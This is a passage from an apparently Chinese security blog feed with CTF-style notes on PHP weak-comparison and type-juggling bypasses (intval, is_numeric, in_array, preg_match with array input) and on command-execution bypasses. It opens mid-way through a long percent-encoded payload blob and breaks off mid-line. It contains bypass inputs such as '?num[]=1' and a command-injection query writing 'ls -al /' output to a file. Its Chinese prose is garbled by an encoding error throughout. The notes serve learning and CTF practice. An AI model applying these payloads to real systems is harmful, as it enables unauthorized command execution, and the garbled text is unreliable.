class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">13</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%a8%<span class="hljs-number">1</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%<span class="hljs-number">39</span>%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;c=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%ed%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%a7%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%e6%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">16</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%<span class="hljs-number">33</span>%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%<span class="hljs-number">6</span>f%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br></code></pre></td></tr></table></figure><p>åœ¨PHPä¸­æœ‰äº›å‡½æ•°ä¼šåœ¨å†…éƒ¨â€œä½¿ç”¨â€å¼±ç›¸ç­‰ï¼Œæ¯”å¦‚switch()ã€in_array()ç­‰å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//switch()å‡½æ•°</span><br><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;2abc&#x27;</span>;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$a</span>)&#123;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">//è¿™é‡Œæ˜¯å¼±æ¯”è¾ƒ</span><br><span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-comment">//åŒä¸Š</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//ç»“æœä¼šè¾“å‡º2</span><br>    <br><span class="hljs-comment">//intval()å‡½æ•°:å°†ä¼ å…¥çš„å‚æ•°è½¬æ¢ä¸ºæ•´æ•°ã€‚å¦‚æœå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒä¼šå°è¯•å°†å­—ç¬¦ä¸²ä¸­çš„æ•°å­—éƒ¨åˆ†æå–å‡ºæ¥å¹¶è½¬æ¢ä¸ºæ•´æ•°ã€‚å¦‚æœå‚æ•°æ˜¯æµ®ç‚¹æ•°ï¼Œå®ƒä¼šå°†æµ®ç‚¹æ•°æˆªæ–­ä¸ºæ•´æ•°ã€‚å¦‚æœå‚æ•°æ˜¯å…¶ä»–ç±»å‹çš„å€¼ï¼Œå®ƒä¼šå°è¯•å°†å…¶è½¬æ¢ä¸ºæ•´æ•°ã€‚**è¿™ä¸ªæ¼æ´å·²ç»è¢«ä¿®å¤äº†ï¼Œç”¨æœªä¿®å¤å‰çš„ç‰ˆæœ¬ä¸¾ä¸ªæ —å­**</span><br><span class="hljs-comment">//å®ƒä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ï¼ˆæ³¨æ„è¿™ä¸ªé€šå¸¸é…åˆpreg_matchæ¥ä½¿ç”¨ï¼‰</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$num</span>=<span class="hljs-number">2e4</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$num</span>; <span class="hljs-comment">//20000</span><br><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>);<span class="hljs-comment">//2</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>&lt;<span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>+<span class="hljs-number">1</span>)&gt;<span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//è®©ä¸€ä¸ªå˜é‡intvalåå°äº2020ä½†æ˜¯åŠ ä¸€åœ¨intvalä¼šå¤§äº2021ï¼Œ2e4å°±æ˜¯ä¸€ä¸ªç†æƒ³çš„å€¼</span><br><br><span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;hello world!&#x27;</span>;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//è¾“å‡ºhello world!</span><br><span class="hljs-comment">//åŒç†è¿˜å¯ä»¥ç”¨0xå¼€å¤´çš„åå…­è¿›åˆ¶ã€0å¼€å¤´çš„å…«è¿›åˆ¶è¿›è¡Œä¸€äº›ç»•è¿‡</span><br><br><span class="hljs-comment">//is_numeric() å‡½æ•°çš„ä½œç”¨æ˜¯åˆ¤æ–­ç»™å®šçš„å€¼æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚å¦‚æœå€¼æ˜¯æ•°å­—æˆ–å¯ä»¥è§£æä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› trueï¼›å¦åˆ™è¿”å› falseã€‚</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">123</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123.0&#x27;</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">0x776179</span>));<span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;0x776179&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123a&#x27;</span>));<span class="hljs-comment">//flase</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&#x27;123 &#x27;</span>));<span class="hljs-comment">//flase</span><br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//in_array()å‡½æ•°ï¼šç”¨äºæ£€æŸ¥ä¸€ä¸ªå€¼æ˜¯å¦å­˜åœ¨äºæ•°ç»„ä¸­ã€‚</span><br>    <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br>å‚æ•°è¯´æ˜ï¼š<br><br>    <span class="hljs-variable">$value</span>ï¼šè¦æ£€æŸ¥çš„å€¼ã€‚<br>    <span class="hljs-variable">$array</span>ï¼šè¦æœç´¢çš„æ•°ç»„ã€‚<br>    <span class="hljs-variable">$strict</span>ï¼ˆå¯é€‰ï¼‰ï¼šæŒ‡å®šæ˜¯å¦è¿›è¡Œä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ï¼Œé»˜è®¤ä¸º <span class="hljs-literal">false</span>ã€‚å¦‚æœè®¾ç½®ä¸º <span class="hljs-literal">true</span>ï¼Œåˆ™ä¸ä»…è¦æ¯”è¾ƒå€¼ï¼Œè¿˜è¦æ¯”è¾ƒæ•°æ®ç±»å‹ã€‚<br><br>è¯¥å‡½æ•°ä¼šéå†æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå¹¶ä¸è¦æ£€æŸ¥çš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ‰¾åˆ°åŒ¹é…çš„å€¼ï¼Œåˆ™è¿”å› <span class="hljs-literal">true</span>ï¼Œå¦åˆ™è¿”å› <span class="hljs-literal">false</span>ã€‚<br>    é—®é¢˜å‡ºåœ¨<span class="hljs-variable">$strict</span>å‚æ•°ï¼Œå¼±ä¸è®¾ç½®åˆ™ä¸ºå¼±æ¯”è¾ƒï¼Œç»•è¿‡æ–¹æ³•è§ä¸Šã€‚    <br></code></pre></td></tr></table></figure><p>è¿˜åœ¨å¸ˆå‚…ä»¬çš„æ–‡ç« ä¸Šçœ‹åˆ°è¿™ä¹ˆä¸€ä¸ªä¸œè¥¿ï¼š<code>preg_match</code>ä¸intvalé…åˆä½¿ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸æŒ‰è§„å®šä¼ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé€šå¸¸æ˜¯ä¼ ä¸€ä¸ªæ•°ç»„è¿›å»ï¼Œè¿™æ ·å°±ä¼šæŠ¥é”™</span><br><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;oh you find meï¼&#x27;</span>ï¼›<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br><br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><br>    &#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//?num[]=1,ä¼ ä¸ªæ•°ç»„å¯ä»¥ç»•è¿‡dieï¼Œç„¶åIntvalæ•°ç»„ä¼šæŠ¥é”™è¿”å›1ï¼Œä»è€Œecho flagã€‚</span><br><br></code></pre></td></tr></table></figure><p>ç±»ä¼¼çš„è¿˜æœ‰array_search()å‡½æ•°ï¼šç”¨äºåœ¨æ•°ç»„ä¸­æœç´¢æŒ‡å®šçš„å€¼ï¼Œå¹¶è¿”å›è¯¥å€¼å¯¹åº”çš„é”®ï¼ˆå³æ•°ç»„ä¸­çš„ç´¢å¼•ä½ç½®ï¼‰ã€‚è¯­æ³•å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-variable">$value</span>, <span class="hljs-variable">$array</span>, <span class="hljs-variable">$strict</span>)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    $valueï¼šè¦æœç´¢çš„å€¼ã€‚</span><br><span class="hljs-comment">    $arrayï¼šè¦æœç´¢çš„æ•°ç»„ã€‚</span><br><span class="hljs-comment">    $strictï¼ˆå¯é€‰ï¼‰ï¼šæŒ‡å®šæ˜¯å¦è¿›è¡Œä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ï¼Œé»˜è®¤ä¸º falseã€‚å¦‚æœè®¾ç½®ä¸º trueï¼Œåˆ™ä¸ä»…è¦æ¯”è¾ƒå€¼ï¼Œè¿˜è¦æ¯”è¾ƒæ•°æ®ç±»å‹ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">è¯¥å‡½æ•°ä¼šéå†æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå¹¶ä¸è¦æœç´¢çš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ‰¾åˆ°åŒ¹é…çš„å€¼ï¼Œåˆ™è¿”å›è¯¥å€¼å¯¹åº”çš„é”®ï¼›å¦‚æœæ‰¾ä¸åˆ°åŒ¹é…çš„å€¼ï¼Œåˆ™è¿”å› falseã€‚</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>â€‹    è¿™ä¸ªå‡½æ•°çš„ä¾‹é¢˜å¯ä»¥å‚è€ƒæ”»é˜²ä¸–ç•Œä¸­çš„easyphpã€‚</p><p>å‚è€ƒäº†è¿™äº›å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_47804678/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">128814377</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_48108919/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">123279251</span><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>c53f7af34ee2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCEä¸­ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹æ³•</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>å…¥é—¨çº§ç†è§£ï¼Œæ²¡å•¥å«é‡‘é‡:)</p><span id="more"></span><p><strong>å‘½ä»¤æ‰§è¡Œæ¼æ´å‰ææ¡ä»¶ï¼š</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.å­˜åœ¨å¯è°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚<br>2.è¯¥å‡½æ•°å‚æ•°å¯æ§ã€‚<br>3.å¯¹å‚æ•°è¿‡æ»¤ä¸ä¸¥æ ¼ã€‚<br></code></pre></td></tr></table></figure><p><strong>ä¸€äº›å¸¸è§å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-number">1</span>.<span class="hljs-keyword">eval</span>()<span class="hljs-comment">//æŠŠä¸€ä¸²å­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œ</span><br><span class="hljs-number">2</span>.<span class="hljs-title function_ invoke__">system</span>()/<span class="hljs-title function_ invoke__">passthru</span>()/<span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-number">3</span>.<span class="hljs-title function_ invoke__">call_user_func</span>()/<span class="hljs-title function_ invoke__">call_user_func_array</span>() <span class="hljs-comment">//å›è°ƒå‡½æ•°</span><br><span class="hljs-number">4</span>.<span class="hljs-title function_ invoke__">creat_function</span>()<br><span class="hljs-number">5</span>.shell_exec <span class="hljs-comment">//æ³¨æ„è¿™ç©æ„å„¿æ²¡å›æ˜¾ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡æŠŠå®ƒä¼ ç»™æŸä¸ªæ–‡ä»¶æˆ–è€…echoçš„æ–¹æ³•çœ‹æ‰§è¡Œç»“æœï¼Œæ¯”å¦‚ï¼š</span><br>    <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ls -l&#x27;</span>); <span class="hljs-comment">// æ‰§è¡Œls -lå‘½ä»¤å¹¶å°†è¾“å‡ºä¿å­˜åˆ°$outputå˜é‡ä¸­</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>     /?cmd=ls -al / &gt; viper3.txt<br><span class="hljs-number">6</span>.è¿˜å¯ä»¥ç”¨åå¼•å·``å’Œ$()æ‰§è¡Œå‘½ä»¤ã€‚<br><span class="hljs-number">7</span>.preg_matchçš„/eæ¨¡å¼æ¼æ´ã€‚<br></code></pre></td></tr></table></figure><p>æœ€åé‚£ä¸ª&#x2F;eæ¨¡å¼å¥½åƒå·²ç»è¢«å¼ƒç”¨å¥½ä¹…äº†ã€‚ã€‚ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(\d+)/e&#x27;</span>;<br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;&quot;$1&quot; + 1&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// è¾“å‡º124</span><br></code></pre></td></tr></table></figure><p><code>/(\d+)/e</code>æ¨¡å¼åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ï¼Œå¹¶ä½¿ç”¨<code>&quot;$1&quot; + 1</code>ä½œä¸ºæ›¿æ¢å­—ç¬¦ä¸²ã€‚åœ¨æ›¿æ¢è¿‡ç¨‹ä¸­ï¼Œ<code>&quot;$1&quot;</code>è¢«è§£æä¸ºåŒ¹é…çš„æ•°å­—ï¼Œç„¶ååŠ 1ã€‚å› æ­¤ï¼Œæœ€ç»ˆçš„æ›¿æ¢ç»“æœæ˜¯123 + 1ï¼Œå³124ã€‚</p><p><strong>ç®¡é“ç¬¦(Windows)ï¼š</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</span><br><span class="hljs-string">||å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥</span><br><span 